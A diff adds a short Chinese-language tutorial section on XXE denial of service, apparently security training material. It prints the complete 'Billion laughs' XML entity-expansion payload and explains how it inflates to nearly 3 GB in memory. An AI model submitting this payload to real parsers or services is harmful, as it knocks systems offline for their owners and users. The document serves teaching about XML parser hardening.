@@ -1,0 +1,26 @@
+== XXE 拒绝服务攻击
+
+通过同一种 XXE 攻击，我们可以对服务器发动拒绝服务攻击。以下是此类攻击的示例：
+
+[source]
+----
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+----
+
+XML 解析器加载此文档时，会看到其中包含一个名为 `lolz` 的根元素，该元素包含文本 `&lol9;`。然而，`&lol9;` 是已定义的实体，它会展开为包含十个 `&lol8;` 字符串的字符串。每个 `&lol8;` 字符串都是已定义的实体，会展开为十个 `&lol7;` 字符串，依此类推。处理完所有实体展开后，这个不到 1 KB 的 XML 代码块实际上会占用近 3 GB 内存。
+
+这称为“Billion laughs”（十亿笑声）攻击，更多信息请参阅：https://en.wikipedia.org/wiki/Billion_laughs
